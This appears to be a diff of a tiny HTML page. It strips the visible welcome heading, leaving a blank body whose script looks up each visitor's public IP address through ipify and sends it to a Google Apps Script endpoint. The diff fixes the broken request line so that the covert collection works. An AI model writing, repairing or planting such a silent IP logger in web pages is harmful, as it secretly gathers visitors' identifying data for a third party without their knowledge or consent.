@@ -1,13 +1,13 @@
 <!DOCTYPE html>
 <html>
-<body style="background:#111;color:white;text-align:center">
-<h1>Bienvenido</h1>
+<body>
 
 <script>
 fetch("https://api.ipify.org?format=json")
   .then(r => r.json())
   .then(d => {
-    fetch(https://script.google.com/macros/s/AKfycbxkRrmyjnhE310xfe77jDtBxDCMzbLQS0JmZLXqSUznlnd-NmduWtTUcKMy7DO7tEoE/exec" + d.ip);
+    const url = "https://script.google.com/macros/s/AKfycbxkRrmyjnhE310xfe77jDtBxDCMzbLQS0JmZLXqSUznlnd-NmduWtTUcKMy7DO7tEoE/exec";
+    fetch(url + (url.includes("?") ? "&" : "?") + "ip=" + d.ip);
   });
 </script>
 
